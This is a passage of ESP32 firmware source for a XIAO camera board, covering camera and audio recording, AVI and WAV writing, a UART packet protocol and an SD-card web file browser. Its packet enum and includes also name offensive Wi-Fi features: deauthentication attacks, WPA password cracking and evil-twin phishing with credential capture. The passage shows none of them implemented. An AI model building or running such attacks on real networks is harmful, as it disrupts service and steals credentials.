#include "esp_camera.h"
#include <Arduino.h>
#include <FS.h>
#include <SPI.h>
#include <SD.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <time.h>
#include "ESP_I2S.h"

// --- CRYPTO INCLUDES FOR WPA CRACKER ---
#include "mbedtls/md.h"
#include "mbedtls/pkcs5.h"
// ---------------------------------------

// XIAO ESP32S3 Sense camera pins
#define PWDN_GPIO_NUM     -1
#define RESET_GPIO_NUM    -1
#define XCLK_GPIO_NUM     10
#define SIOD_GPIO_NUM     40
#define SIOC_GPIO_NUM     39
#define Y9_GPIO_NUM       48
#define Y8_GPIO_NUM       11
#define Y7_GPIO_NUM       12
#define Y6_GPIO_NUM       14
#define Y5_GPIO_NUM       16
#define Y4_GPIO_NUM       18
#define Y3_GPIO_NUM       17
#define Y2_GPIO_NUM       15
#define VSYNC_GPIO_NUM    38
#define HREF_GPIO_NUM     47
#define PCLK_GPIO_NUM     13

// UART wiring:
// - XIAO TX -> Matrix RX
// - XIAO RX -> Matrix TX (required for remote capture command)
// - GND <-> GND
static const int CAM_UART_TX_PIN = 43;
static const int CAM_UART_RX_PIN = 44;
static const uint32_t CAM_UART_BAUD = 921600;

// Packet framing (must match main.ino UART parser)
static const uint8_t PKT_HEAD1 = 0xC3;
static const uint8_t PKT_HEAD2 = 0x3C;
static const uint8_t PKT_TAIL1 = 0xA5;
static const uint8_t PKT_TAIL2 = 0x5A;

enum PacketType : uint8_t {
  PKT_FRAME_START = 0x01,
  PKT_LINE = 0x02,
  PKT_FRAME_END = 0x03,
  PKT_PING = 0x04,
  PKT_CMD = 0x10,
  PKT_CAPTURE_START = 0x20,
  PKT_CAPTURE_CHUNK = 0x21,
  PKT_CAPTURE_END = 0x22,
  PKT_CAPTURE_ACK = 0x23,
  PKT_STATUS = 0x30,
  PKT_SD_LIST_CHUNK = 0x31,
  PKT_SD_LIST_END = 0x32,

  // WIFI Offload via XIAO
  PKT_WIFI_SCAN_CMD = 0x50,
  PKT_WIFI_SCAN_RES = 0x51,
  PKT_DEAUTH_ATK_CMD = 0x52,
  PKT_DEAUTH_ATK_STAT = 0x53,
  PKT_CRACK_DICT_REQ = 0x60,
  PKT_CRACK_DICT_RES = 0x61,
  PKT_CRACK_CAP_START = 0x62,
  PKT_CRACK_STAT = 0x63,
  PKT_CRACK_RUN_START = 0x64,

  // Net.Probe (LAN Scanner)
  PKT_LAN_SCAN_CMD = 0x70,
  PKT_LAN_SCAN_RES = 0x71,
  PKT_LAN_SCAN_STAT = 0x72,

  // File Pull Protocol
  PKT_FILE_PULL_REQ = 0x83,
  PKT_FILE_PULL_RES = 0x84,
  PKT_FILE_PULL_CHUNK = 0x85,
  PKT_FILE_PULL_ACK = 0x86,
  PKT_FILE_PULL_END = 0x87,

  // Evil Twin Phishing
  PKT_EVIL_TWIN_CMD = 0x80,
  PKT_EVIL_TWIN_STAT = 0x81,
  PKT_EVIL_TWIN_CREDS = 0x82
};

static const uint8_t CMD_CAPTURE_3MP = 0x31;
static const uint8_t CMD_SET_STREAM_CTRL = 0x32;
static const uint8_t CMD_REC_START = 0x41;
static const uint8_t CMD_REC_STOP = 0x42;
static const uint8_t CMD_SD_LIST = 0x43;
static const uint8_t CMD_WEB_SERVER = 0x44;
static const uint8_t CMD_WIFI_CFG = 0x45;
static const uint8_t CMD_TIME_SET = 0x46;
static const uint8_t CMD_AUDIO_REC_START = 0x47;
static const uint8_t CMD_AUDIO_REC_STOP = 0x48;
static const uint8_t CMD_FILE_PUSH_START = 0x49;
static const uint8_t CMD_FILE_PUSH_CHUNK = 0x4A;
static const uint8_t CMD_FILE_PUSH_END = 0x4B;
static const uint8_t CMD_AUDIO_REC_PAUSE = 0x4C;
static const uint8_t CMD_AUDIO_REC_RESUME = 0x4D;

static const uint16_t CAM_W = 96;
static const uint16_t CAM_H = 96;
static const uint16_t CAPTURE_CHUNK = 512;

// XIAO Sense mic + SD pinout from user wiring.
static const int MIC_DATA_PIN = 41;
static const int MIC_CLK_PIN = 42;
static const int SD_CS_PIN = 21;
static const int SD_SCK_PIN = 7;
static const int SD_MISO_PIN = 8;
static const int SD_MOSI_PIN = 9;
// Sensor orientation fix for physical mounting.
// If the camera module is installed upside down, keep this true.
static const bool CAM_INSTALL_UPSIDE_DOWN = true;
static const int CAM_SENSOR_VFLIP = CAM_INSTALL_UPSIDE_DOWN ? 0 : 1;
static const int CAM_SENSOR_HMIRROR = CAM_INSTALL_UPSIDE_DOWN ? 1 : 0;
static bool cameraInitialized = false;
static bool cameraStillMode = false;
static bool cameraRecordMode = false;
static uint8_t cameraCtlFilter = 0;
static int8_t cameraCtlBrightness = -1;
static int8_t cameraCtlContrast = -1;
static int8_t cameraCtlSaturation = -2;

static sensor_t *camSensor = nullptr;
static SPIClass sdSpi(FSPI);
static I2SClass micI2S;
static bool sdReady = false;
static bool micReady = false;
static bool recordingActive = false;
static File recAviFile;
static File recRawVideoFile;
static File recRawAudioFile;
static String recBaseName = "";
static uint32_t recStartMs = 0;
static uint32_t recLastStatusMs = 0;
static uint32_t recAudioBytes = 0;
static uint32_t recAudioPacedBytes = 0;
static uint32_t recVideoFrames = 0;
static uint32_t recRawAudioBytes = 0;
static uint32_t recRawVideoFrames = 0;
static uint8_t recLastRawFrame[CAM_W * CAM_H * 2];
static bool recLastRawFrameValid = false;
static int16_t recLastAudioSample = 0;
static uint32_t recMoviListSizePos = 0;
static uint32_t recRiffSizePos = 0;
static uint32_t recAviFramesPos = 0;
static uint32_t recVidFramesPos = 0;
static uint32_t recAudLengthPos = 0;
static uint32_t recMoviStartPos = 0;
static uint32_t recNextVideoMs = 0;
static uint32_t streamPauseUntilMs = 0;
static const uint16_t REC_FPS = 18;
static const uint32_t REC_VIDEO_INTERVAL_MS = 1000 / REC_FPS;
static const uint32_t REC_AUDIO_RATE = 16000;
static const uint8_t REC_AUDIO_BITS = 16;
static const uint8_t REC_AUDIO_BYTES_PER_SAMPLE = REC_AUDIO_BITS / 8;
static const bool REC_AUDIO_ENABLE_POSTFX = false;
static const uint8_t REC_AUDIO_VOLUME_GAIN = 2;
static const int16_t REC_AUDIO_NOISE_GATE = 0;
static const uint8_t REC_VIDEO_BPP = 24;
static const uint32_t REC_MAX_MS = 120000;
static const bool REC_DEFER_VIDEO_CONVERT_TO_POSTPROCESS = true;
static const bool REC_KEEP_RAW_FILES = false;
static const bool REC_DISABLE_LIVE_STREAM_WHILE_RECORDING = true;
static const uint8_t REC_PREVIEW_EVERY_N_FRAMES = 4;
static const uint32_t REC_AUDIO_MAX_BYTES_PER_LOOP = 4096;
static const uint8_t REC_MAX_VIDEO_CATCHUP_STEPS = 3;
static const uint32_t REC_FRAME_STALL_MS = 1500;
static const uint32_t REC_CAMERA_REINIT_COOLDOWN_MS = 2500;

static uint32_t recLastFreshFrameMs = 0;
static uint32_t recLastCameraRecoverMs = 0;
static uint32_t recLastFrameSig = 0;
static uint16_t recSameFrameCount = 0;
static bool recNeedCameraRecover = false;

static WebServer xiaoServer(80);
static bool xiaoRoutesReady = false;
static bool xiaoWebDesired = false;
static bool xiaoWebRunning = false;
static String xiaoWifiSsid = "";
static String xiaoWifiPass = "";
static uint32_t xiaoLastWifiAttemptMs = 0;
static uint32_t xiaoUnixBase = 0;
static uint32_t xiaoUnixBaseMs = 0;
static uint32_t xiaoLastWebUrlStatusMs = 0;

static bool xiaoAudioRecActive = false;
static bool xiaoAudioRecPaused = false;
static File xiaoAudioFile;
static String xiaoAudioFilePath = "";
static uint32_t xiaoAudioBytes = 0;
static uint32_t xiaoAudioStatusMs = 0;
static uint32_t xiaoAudioStartMs = 0;
static uint32_t xiaoAudioPauseStartMs = 0;
static uint32_t xiaoAudioPauseAccumMs = 0;
static uint32_t xiaoAudioPacedBytes = 0;
static int16_t xiaoAudioLastSample = 0;

static bool xiaoPushActive = false;
static File xiaoPushFile;
static uint16_t xiaoPushNextSeq = 0;
static uint32_t xiaoPushBytes = 0;
static uint32_t xiaoPushExpectedBytes = 0;
static String xiaoPushPath = "";

static void sendStatusText(const String &s);
static void writeLE16(File &f, uint16_t v);
static void writeLE32(File &f, uint32_t v);
static bool initSdCard();
static bool initMic();

static uint32_t xiaoNowUnix() {
  if (xiaoUnixBase == 0) return 0;
  return xiaoUnixBase + ((millis() - xiaoUnixBaseMs) / 1000UL);
}

static String xiaoTsTag() {
  uint32_t ts = xiaoNowUnix();
  if (ts == 0) ts = millis() / 1000UL;
  char out[24];
  if (xiaoNowUnix() > 0) {
    time_t t = (time_t)ts;
    struct tm tmv;
    localtime_r(&t, &tmv);
    snprintf(out, sizeof(out), "%04d%02d%02d_%02d%02d%02d",
             tmv.tm_year + 1900, tmv.tm_mon + 1, tmv.tm_mday,
             tmv.tm_hour, tmv.tm_min, tmv.tm_sec);
  } else {
    snprintf(out, sizeof(out), "U%lu", (unsigned long)ts);
  }
  return String(out);
}

static uint32_t xiaoAudioElapsedSeconds() {
  if (!xiaoAudioRecActive) {
    return (unsigned long)(xiaoAudioBytes / 2 / REC_AUDIO_RATE);
  }
  uint32_t now = millis();
  uint32_t pausedAccum = xiaoAudioPauseAccumMs;
  if (xiaoAudioRecPaused && xiaoAudioPauseStartMs > 0) {
    pausedAccum += (now - xiaoAudioPauseStartMs);
  }
  if (now <= xiaoAudioStartMs + pausedAccum) return 0;
  return (now - xiaoAudioStartMs - pausedAccum) / 1000UL;
}

static void xiaoSendAudioState(const char *eventName) {
  String s = String("AUDIO_STATE event=") + eventName +
             " active=" + (xiaoAudioRecActive ? "1" : "0") +
             " paused=" + (xiaoAudioRecPaused ? "1" : "0") +
             " sec=" + String((unsigned long)xiaoAudioElapsedSeconds()) +
             " bytes=" + String((unsigned long)xiaoAudioBytes);
  if (xiaoAudioFilePath.length() > 0) s += String(" file=") + xiaoAudioFilePath;
  sendStatusText(s);
}

static void xiaoWriteWavHeader(File &f, uint32_t dataBytes) {
  const uint32_t byteRate = REC_AUDIO_RATE * REC_AUDIO_BYTES_PER_SAMPLE;
  const uint16_t blockAlign = REC_AUDIO_BYTES_PER_SAMPLE;
  const uint32_t riffSize = 36 + dataBytes;
  f.seek(0);
  f.write((const uint8_t *)"RIFF", 4);
  writeLE32(f, riffSize);
  f.write((const uint8_t *)"WAVE", 4);
  f.write((const uint8_t *)"fmt ", 4);
  writeLE32(f, 16);
  writeLE16(f, 1);
  writeLE16(f, 1);
  writeLE32(f, REC_AUDIO_RATE);
  writeLE32(f, byteRate);
  writeLE16(f, blockAlign);
  writeLE16(f, REC_AUDIO_BITS);
  f.write((const uint8_t *)"data", 4);
  writeLE32(f, dataBytes);
}

static bool xiaoStartAudioRec() {
  if (xiaoAudioRecActive) return true;
  if (!sdReady && !initSdCard()) return false;
  if (!micReady && !initMic()) return false;
  if (!SD.exists("/voice")) SD.mkdir("/voice");
  String p = String("/voice/voice_") + xiaoTsTag() + ".wav";
  xiaoAudioFile = SD.open(p, FILE_WRITE);
  if (!xiaoAudioFile) return false;
  xiaoWriteWavHeader(xiaoAudioFile, 0);
  xiaoAudioFilePath = p;
  xiaoAudioBytes = 0;
  xiaoAudioRecPaused = false;
  xiaoAudioStartMs = millis();
  xiaoAudioPauseStartMs = 0;
  xiaoAudioPauseAccumMs = 0;
  xiaoAudioPacedBytes = 0;
  xiaoAudioLastSample = 0;
  xiaoAudioStatusMs = millis();
  xiaoAudioRecActive = true;
  xiaoSendAudioState("start");
  return true;
}

static void xiaoPauseAudioRec() {
  if (!xiaoAudioRecActive || xiaoAudioRecPaused) return;
  xiaoAudioRecPaused = true;
  xiaoAudioPauseStartMs = millis();
  xiaoSendAudioState("pause");
}

static void xiaoResumeAudioRec() {
  if (!xiaoAudioRecActive || !xiaoAudioRecPaused) return;
  if (xiaoAudioPauseStartMs > 0) {
    xiaoAudioPauseAccumMs += (millis() - xiaoAudioPauseStartMs);
  }
  xiaoAudioPauseStartMs = 0;
  xiaoAudioRecPaused = false;
  xiaoSendAudioState("resume");
}

static void xiaoStopAudioRec() {
  if (!xiaoAudioRecActive) return;
  if (xiaoAudioRecPaused && xiaoAudioPauseStartMs > 0) {
    xiaoAudioPauseAccumMs += (millis() - xiaoAudioPauseStartMs);
  }
  xiaoAudioPauseStartMs = 0;
  xiaoAudioRecPaused = false;
  xiaoAudioRecActive = false;
  if (xiaoAudioFile) {
    xiaoWriteWavHeader(xiaoAudioFile, xiaoAudioBytes);
    xiaoAudioFile.flush();
    xiaoAudioFile.close();
  }
  xiaoSendAudioState("saved");
}

static void xiaoAudioRecStep() {
  if (!xiaoAudioRecActive || !xiaoAudioFile || !micReady) return;
  if (!xiaoAudioRecPaused) {
    uint32_t now = millis();
    uint32_t activeMs = now - xiaoAudioStartMs;
    if (xiaoAudioPauseAccumMs < activeMs) activeMs -= xiaoAudioPauseAccumMs;
    else activeMs = 0;

    uint32_t expectedBytes = (uint32_t)(((uint64_t)activeMs * REC_AUDIO_RATE * REC_AUDIO_BYTES_PER_SAMPLE) / 1000ULL);
    uint32_t needBytes = (expectedBytes > xiaoAudioPacedBytes) ? (expectedBytes - xiaoAudioPacedBytes) : 0;
    if (needBytes > 4096) needBytes = 4096;

    static uint8_t buf[1024];
    while (needBytes >= 2) {
      size_t ask = needBytes;
      if (ask > sizeof(buf)) ask = sizeof(buf);
      ask &= ~((size_t)1);
      if (ask < 2) break;

      size_t got = 0;
      uint32_t chunkMs = (uint32_t)(((uint64_t)ask * 1000ULL) / (REC_AUDIO_RATE * 2ULL));
      if (chunkMs < 4) chunkMs = 4;
      if (chunkMs > 24) chunkMs = 24;
      uint32_t readDeadline = millis() + chunkMs + 18;
      while (got < ask && (int32_t)(readDeadline - millis()) > 0) {
        size_t take = ask - got;
        if (take > 512) take = 512;
        size_t n = micI2S.readBytes((char *)(buf + got), take);
        if (n == 0) {
          delay(1);
          continue;
        }
        got += n;
      }

      size_t gotAligned = got & ~((size_t)1);
      if (gotAligned >= 2) {
        int16_t prev = xiaoAudioLastSample;
        for (size_t i = 0; i + 1 < gotAligned; i += 2) {
          int16_t s = 0;
          memcpy(&s, buf + i, sizeof(s));
          int32_t d = (int32_t)s - (int32_t)prev;
          const int16_t MAX_STEP = 2400;
          if (d > MAX_STEP) s = (int16_t)(prev + MAX_STEP);
          else if (d < -MAX_STEP) s = (int16_t)(prev - MAX_STEP);
          memcpy(buf + i, &s, sizeof(s));
          prev = s;
        }
        xiaoAudioLastSample = prev;

        if (REC_AUDIO_VOLUME_GAIN > 0) {
          for (size_t i = 0; i + 1 < gotAligned; i += 2) {
            int16_t s = 0;
            memcpy(&s, buf + i, sizeof(s));
            int32_t v = ((int32_t)s) << REC_AUDIO_VOLUME_GAIN;
            if (v > 32767) v = 32767;
            if (v < -32768) v = -32768;
            s = (int16_t)v;
            memcpy(buf + i, &s, sizeof(s));
          }
        }
      }

      if (gotAligned < ask) {
        for (size_t i = gotAligned; i + 1 < ask; i += 2) {
          memcpy(buf + i, &xiaoAudioLastSample, sizeof(xiaoAudioLastSample));
        }
      }

      if (xiaoAudioFile.write(buf, ask) == ask) {
        xiaoAudioBytes += (uint32_t)ask;
        xiaoAudioPacedBytes += (uint32_t)ask;
      } else {
        break;
      }

      needBytes = (expectedBytes > xiaoAudioPacedBytes) ? (expectedBytes - xiaoAudioPacedBytes) : 0;
      if (needBytes > 4096) needBytes = 4096;
    }
  }
  if ((int32_t)(millis() - xiaoAudioStatusMs) > 1200) {
    xiaoAudioStatusMs = millis();
    xiaoSendAudioState("tick");
  }
}

static void xiaoPowerDownWifi() {
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
}

static String xiaoMimeTypeForPath(const String &path) {
  String lower = path;
  lower.toLowerCase();
  if (lower.endsWith(".mp4")) return "video/mp4";
  if (lower.endsWith(".avi")) return "video/x-msvideo";
  if (lower.endsWith(".wav")) return "audio/wav";
  if (lower.endsWith(".jpg") || lower.endsWith(".jpeg")) return "image/jpeg";
  if (lower.endsWith(".bmp")) return "image/bmp";
  if (lower.endsWith(".gif")) return "image/gif";
  if (lower.endsWith(".png")) return "image/png";
  if (lower.endsWith(".txt")) return "text/plain";
  return "application/octet-stream";
}

static bool xiaoSanitizeSdPath(String &path) {
  path.trim();
  if (path.length() == 0) return false;
  if (!path.startsWith("/")) path = "/" + path;
  if (path.indexOf("..") >= 0) return false;
  return true;
}

static void xiaoAppendSdFilesRecursive(const String &dirPath, String &json, bool &first, uint8_t depth) {
  if (!sdReady || depth > 6) return;
  File dir = SD.open(dirPath, FILE_READ);
  if (!dir || !dir.isDirectory()) {
    if (dir) dir.close();
    return;
  }
  File f = dir.openNextFile();
  while (f) {
    String n = String(f.name());
    if (!n.startsWith("/")) {
      if (dirPath == "/") n = "/" + n;
      else n = dirPath + "/" + n;
    }
    if (f.isDirectory()) {
      f.close();
      xiaoAppendSdFilesRecursive(n, json, first, depth + 1);
    } else {
      if (!first) json += ",";
      json += "{\"name\":\"" + n + "\",\"size\":" + String((unsigned long)f.size()) + "}";
      first = false;
      f.close();
    }
    f = dir.openNextFile();
  }
  dir.close();
}

static bool xiaoCameraBusyForWeb() {
  return recordingActive || cameraStillMode || cameraRecordMode;
}

static void xiaoHandleRoot() {
  String html =
R"HTML(<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>XIAO SD</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-slate-900 text-slate-100 min-h-screen"><div class="max-w-6xl mx-auto p-4"><h1 class="text-xl font-bold mb-2">XIAO SD Browser</h1><div class="text-xs text-slate-400 mb-4">Grouped view. Audio list refresh is manual.</div><div class="grid grid-cols-1 md:grid-cols-2 gap-4"><section class="p-3 rounded bg-slate-800 border border-slate-700"><div class="flex items-center justify-between mb-2"><h2 class="font-semibold">Images</h2><span id="imgCount" class="text-xs text-slate-400">0</span></div><div id="imgList" class="grid grid-cols-3 gap-3"></div></section><section class="p-3 rounded bg-slate-800 border border-slate-700"><div class="flex items-center justify-between mb-2"><h2 class="font-semibold">Audio</h2><div class="flex items-center gap-2"><span id="audCount" class="text-xs text-slate-400">0</span><button id="audRefreshBtn" class="px-2 py-1 rounded bg-emerald-700 text-xs" onclick="refreshAudio()">Refresh Audio</button></div></div><div id="audList" class="grid grid-cols-1 gap-3"></div></section><section class="p-3 rounded bg-slate-800 border border-slate-700"><div class="flex items-center justify-between mb-2"><h2 class="font-semibold">Videos</h2><span id="vidCount" class="text-xs text-slate-400">0</span></div><div id="vidList" class="grid grid-cols-1 gap-3"></div></section><section class="p-3 rounded bg-slate-800 border border-slate-700"><div class="flex items-center justify-between mb-2"><h2 class="font-semibold">Other Files</h2><span id="othCount" class="text-xs text-slate-400">0</span></div><div id="othList" class="grid grid-cols-1 gap-3"></div></section></div></div><script>
const q=id=>document.getElementById(id);
let allFiles=[];

function classify(name){
  const n=(name||'').toLowerCase();
  if(/\.(jpg|jpeg|bmp|gif|png)$/i.test(n)) return 'img';
  if(/\.(wav|mp3)$/i.test(n)) return 'aud';
  if(/\.(mp4|avi)$/i.test(n)) return 'vid';
  return 'oth';
}

async function del(path){
  const ok=confirm('Delete '+path+' ?');
  if(!ok) return;
  const u='/api/sd/delete?path='+encodeURIComponent(path);
  const r=await fetch(u);
  if(!r.ok){alert('Delete failed');return;}
  await loadAll();
}

function buildCard(f){
  const group=classify(f.name);
  const isAvi=/\.avi$/i.test(f.name);
  const isVideoPreview=/\.mp4$/i.test(f.name);
  const isAudio=/\.(wav|mp3)$/i.test(f.name);
  const isImage=/\.(jpg|jpeg|bmp|gif|png)$/i.test(f.name);

  const w=document.createElement('div');
  w.className='bg-slate-900 rounded p-3 border border-slate-700';
  const t=document.createElement('div');
  t.className='text-sm font-semibold mb-2 break-all';
  t.textContent=f.name;
  w.appendChild(t);

  if(isVideoPreview){
    const v=document.createElement('video');
    v.controls=true;
    v.className='w-full rounded mb-2';
    v.src='/sd?path='+encodeURIComponent(f.name);
    w.appendChild(v);
  }else if(isAudio){
    const a=document.createElement('audio');
    a.controls=true;
    a.className='w-full mb-2';
    a.src='/sd?path='+encodeURIComponent(f.name);
    w.appendChild(a);
  }else if(isImage){
    const i=document.createElement('img');
    i.className='w-full h-44 object-cover rounded mb-2';
    i.src='/sd?path='+encodeURIComponent(f.name);
    w.appendChild(i);
  }else if(isAvi){
    const n=document.createElement('div');
    n.className='text-xs text-amber-300 mb-2';
    n.textContent='AVI preview disabled, download only';
    w.appendChild(n);
  }

  const row=document.createElement('div');
  row.className='flex items-center justify-between text-xs';
  const sz=document.createElement('div');
  sz.textContent=(f.size||0)+' bytes';
  const act=document.createElement('div');
  act.className='flex gap-2';
  const dl=document.createElement('a');
  dl.className='px-2 py-1 rounded bg-slate-700';
  dl.href='/sd?path='+encodeURIComponent(f.name)+'&download=1';
  dl.textContent='Download';
  dl.target='_blank';
  const db=document.createElement('button');
  db.className='px-2 py-1 rounded bg-red-700';
  db.textContent='Delete';
  db.onclick=()=>del(f.name);
  act.appendChild(dl);
  act.appendChild(db);
  row.appendChild(sz);
  row.appendChild(act);
  w.appendChild(row);

  return {group,card:w};
}

function renderGroups(opts){
  const refreshAudio=!!(opts&&opts.refreshAudio);
  const img=q('imgList');
  const aud=q('audList');
  const vid=q('vidList');
  const oth=q('othList');
  if(!img||!aud||!vid||!oth) return;

  img.innerHTML='';
  if(refreshAudio) aud.innerHTML='';
  vid.innerHTML='';
  oth.innerHTML='';

  let imgN=0,audN=0,vidN=0,othN=0;
  for(const f of allFiles){
    const built=buildCard(f);
    if(built.group==='img'){img.appendChild(built.card);imgN++;}
    else if(built.group==='aud'){if(refreshAudio){aud.appendChild(built.card);}audN++;}
    else if(built.group==='vid'){vid.appendChild(built.card);vidN++;}
    else {oth.appendChild(built.card);othN++;}
  }
  q('imgCount').textContent=String(imgN);
  q('audCount').textContent=String(audN);
  q('vidCount').textContent=String(vidN);
  q('othCount').textContent=String(othN);
}

async function loadAll(){
  const r=await fetch('/api/sd/files');
  if(!r.ok) return;
  const data=await r.json();
  allFiles=(data.files||[]);
  renderGroups({refreshAudio:true});
}

async function refreshAudio(){
  const btn=q('audRefreshBtn');
  if(btn){btn.disabled=true;btn.textContent='Refreshing...';}
  try{
    const r=await fetch('/api/sd/files');
    if(r.ok){
      const data=await r.json();
      allFiles=(data.files||[]);
      renderGroups({refreshAudio:true});
    }
  }finally{
    if(btn){btn.disabled=false;btn.textContent='Refresh Audio';}
  }
}

loadAll();
setInterval(async()=>{
  const r=await fetch('/api/sd/files');
  if(!r.ok) return;
  const data=await r.json();
  allFiles=(data.files||[]);
  renderGroups({refreshAudio:false});
},5000);
</script></body></html>)HTML";
  xiaoServer.send(200, "text/html", html);
}

static void xiaoHandleSdFiles() {
  String json = "{\"files\":[";
  bool first = true;
  xiaoAppendSdFilesRecursive("/", json, first, 0);
  json += "]}";
  xiaoServer.send(200, "application/json", json);
}

static void xiaoHandleSdStream() {
  if (!xiaoServer.hasArg("path")) { xiaoServer.send(400, "text/plain", "missing path"); return; }
  String path = xiaoServer.arg("path");
  if (!xiaoSanitizeSdPath(path)) { xiaoServer.send(400, "text/plain", "bad path"); return; }
  if (!sdReady || !SD.exists(path)) { xiaoServer.send(404, "text/plain", "not found"); return; }
  File f = SD.open(path, FILE_READ);
  if (!f) { xiaoServer.send(500, "text/plain", "open failed"); return; }
  if (xiaoServer.hasArg("download") && xiaoServer.arg("download") == "1") {
    String name = path;
    int slash = name.lastIndexOf('/');
    if (slash >= 0) name = name.substring(slash + 1);
    xiaoServer.sendHeader("Content-Disposition", String("attachment; filename=\"") + name + "\"");
  }
  xiaoServer.streamFile(f, xiaoMimeTypeForPath(path));
  f.close();
}

static void xiaoHandleSdDelete() {
  if (!xiaoServer.hasArg("path")) { xiaoServer.send(400, "text/plain", "missing path"); return; }
  String path = xiaoServer.arg("path");
  if (!xiaoSanitizeSdPath(path)) { xiaoServer.send(400, "text/plain", "bad path"); return; }
  if (!sdReady || !SD.exists(path)) { xiaoServer.send(404, "text/plain", "not found"); return; }
  if (!SD.remove(path)) { xiaoServer.send(500, "text/plain", "delete failed"); return; }
  xiaoServer.send(200, "text/plain", "OK");
}

static void xiaoWebSetupRoutes() {
  if (xiaoRoutesReady) return;
  xiaoServer.on("/", HTTP_GET, xiaoHandleRoot);
  xiaoServer.on("/api/sd/files", HTTP_GET, xiaoHandleSdFiles);
  xiaoServer.on("/sd", HTTP_GET, xiaoHandleSdStream);
  xiaoServer.on("/api/sd/delete", HTTP_GET, xiaoHandleSdDelete);
  xiaoRoutesReady = true;
}

static bool xiaoTryConnectWifi() {
  if (xiaoWifiSsid.length() == 0) return false;
  if (WiFi.status() == WL_CONNECTED) return true;
  if ((int32_t)(millis() - xiaoLastWifiAttemptMs) < 3000) return false;
  xiaoLastWifiAttemptMs = millis();
  WiFi.mode(WIFI_STA);
  WiFi.begin(xiaoWifiSsid.c_str(), xiaoWifiPass.c_str());
  return false;
}

static bool xiaoStartWebServer() {
  if (xiaoWebRunning) return true;
  if (xiaoCameraBusyForWeb()) return false;
  if (!xiaoTryConnectWifi() && WiFi.status() != WL_CONNECTED) return false;
  if (WiFi.status() != WL_CONNECTED) return false;

  xiaoWebSetupRoutes();
  xiaoServer.begin();
  xiaoWebRunning = true;
  xiaoLastWebUrlStatusMs = millis();
  sendStatusText(String("XIAO web http://") + WiFi.localIP().toString());
  return true;
}

static void xiaoStopWebServer(bool powerDownWifi = false) {
  if (!xiaoWebRunning) return;
  xiaoServer.stop();
  xiaoWebRunning = false;
  if (powerDownWifi) xiaoPowerDownWifi();
  sendStatusText("XIAO web stopped");
}

static void xiaoWebTick() {
  if (!xiaoWebDesired) {
    if (xiaoWebRunning) xiaoStopWebServer(true);
    else xiaoPowerDownWifi();
    return;
  }

  if (xiaoCameraBusyForWeb()) {
    if (xiaoWebRunning) xiaoStopWebServer(false);
    return;
  }
  if (!xiaoWebRunning) {
    (void)xiaoStartWebServer();
    return;
  }
  if (xiaoNowUnix() == 0 && (millis() % 1000) < 40) {
    sendStatusText("TIME_REQ");
  }
  xiaoServer.handleClient();
}

static void writeLE16(File &f, uint16_t v) {
  uint8_t b[2] = {(uint8_t)(v & 0xFF), (uint8_t)((v >> 8) & 0xFF)};
  f.write(b, sizeof(b));
}

static void writeLE32(File &f, uint32_t v) {
  uint8_t b[4] = {
    (uint8_t)(v & 0xFF),
    (uint8_t)((v >> 8) & 0xFF),
    (uint8_t)((v >> 16) & 0xFF),
    (uint8_t)((v >> 24) & 0xFF)
  };
  f.write(b, sizeof(b));
}

static void writeFourCC(File &f, const char cc[4]) {
  f.write((const uint8_t *)cc, 4);
}

static bool aviWriteHeader(File &f, uint16_t fps) {
  if (fps == 0) fps = 1;
  recRiffSizePos = 4;
  writeFourCC(f, "RIFF");
  writeLE32(f, 0);
  writeFourCC(f, "AVI ");

  uint32_t hdrlSizePos = (uint32_t)f.position() + 4;
  writeFourCC(f, "LIST");
  writeLE32(f, 0);
  writeFourCC(f, "hdrl");

  writeFourCC(f, "avih");
  writeLE32(f, 56);
  writeLE32(f, 1000000UL / fps);
  writeLE32(f, CAM_W * CAM_H * 3 * fps + REC_AUDIO_RATE * 2);
  writeLE32(f, 0);
  writeLE32(f, 0x10);
  recAviFramesPos = (uint32_t)f.position();
  writeLE32(f, 0);
  writeLE32(f, 0);
  writeLE32(f, 2);
  writeLE32(f, CAM_W * CAM_H * 3);
  writeLE32(f, CAM_W);
  writeLE32(f, CAM_H);
  writeLE32(f, 0);
  writeLE32(f, 0);
  writeLE32(f, 0);
  writeLE32(f, 0);

  uint32_t vStrlSizePos = (uint32_t)f.position() + 4;
  writeFourCC(f, "LIST");
  writeLE32(f, 0);
  writeFourCC(f, "strl");

  writeFourCC(f, "strh");
  writeLE32(f, 56);
  writeFourCC(f, "vids");
  writeFourCC(f, "DIB ");
  writeLE32(f, 0);
  writeLE16(f, 0);
  writeLE16(f, 0);
  writeLE32(f, 0);
  writeLE32(f, 1);
  writeLE32(f, fps);
  writeLE32(f, 0);
  recVidFramesPos = (uint32_t)f.position();
  writeLE32(f, 0);
  writeLE32(f, CAM_W * CAM_H * 3);
  writeLE32(f, 0xFFFFFFFF);
  writeLE32(f, 0);
  writeLE16(f, 0);
  writeLE16(f, 0);
  writeLE16(f, CAM_W);
  writeLE16(f, CAM_H);

  writeFourCC(f, "strf");
  writeLE32(f, 40);
  writeLE32(f, 40);
  writeLE32(f, CAM_W);
  writeLE32(f, CAM_H);
  writeLE16(f, 1);
  writeLE16(f, REC_VIDEO_BPP);
  writeLE32(f, 0);
  writeLE32(f, CAM_W * CAM_H * 3);
  writeLE32(f, 0);
  writeLE32(f, 0);
  writeLE32(f, 0);
  writeLE32(f, 0);

  uint32_t vStrlEnd = (uint32_t)f.position();
  f.seek(vStrlSizePos);
  writeLE32(f, vStrlEnd - (vStrlSizePos + 4));
  f.seek(vStrlEnd);

  uint32_t aStrlSizePos = (uint32_t)f.position() + 4;
  writeFourCC(f, "LIST");
  writeLE32(f, 0);
  writeFourCC(f, "strl");

  writeFourCC(f, "strh");
  writeLE32(f, 56);
  writeFourCC(f, "auds");
  writeLE32(f, 0);
  writeLE32(f, 0);
  writeLE16(f, 0);
  writeLE16(f, 0);
  writeLE32(f, 0);
  writeLE32(f, 2);
  writeLE32(f, REC_AUDIO_RATE * 2);
  writeLE32(f, 0);
  recAudLengthPos = (uint32_t)f.position();
  writeLE32(f, 0);
  writeLE32(f, 512);
  writeLE32(f, 0xFFFFFFFF);
  writeLE32(f, 2);
  writeLE16(f, 0);
  writeLE16(f, 0);
  writeLE16(f, 0);
  writeLE16(f, 0);

  writeFourCC(f, "strf");
  writeLE32(f, 16);
  writeLE16(f, 1);
  writeLE16(f, 1);
